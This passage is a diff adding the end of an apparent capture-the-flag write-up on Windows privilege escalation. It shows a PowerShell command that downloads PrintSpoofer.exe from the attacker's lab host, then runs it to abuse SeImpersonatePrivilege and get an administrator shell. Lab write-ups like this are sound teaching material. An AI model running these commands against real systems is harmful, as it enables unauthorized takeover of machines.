@@ -244,3 +244,20 @@ c:\windows\system32\inetsrv>
 
 ```SeImpersonatePrivilege``` is enabled, now let find a way to abuse to get administrator access. And with the help of a tools called ```PrintSpoofer```
 
+![image](https://user-images.githubusercontent.com/87468669/194744560-7c94aa38-e6db-4f60-bc9d-d21504abfe66.png)
+
+Now let's download it into our target machine
+
+```
+c:\Users\Bob>powershell -c curl http://10.8.12.222:8000/PrintSpoofer.exe -o printspoofer.exe
+
+printspoofer.exe -i -c powershell
+```
+
+![image](https://user-images.githubusercontent.com/87468669/194744953-18dc34cc-e8ed-44fd-8816-56131873b6a5.png)
+
+We are now Administrator great 
+
+![image](https://user-images.githubusercontent.com/87468669/194745074-41bab5ea-2e10-4765-a741-8a59ed483283.png)
+
+And we are done. Hope you had fun 😉
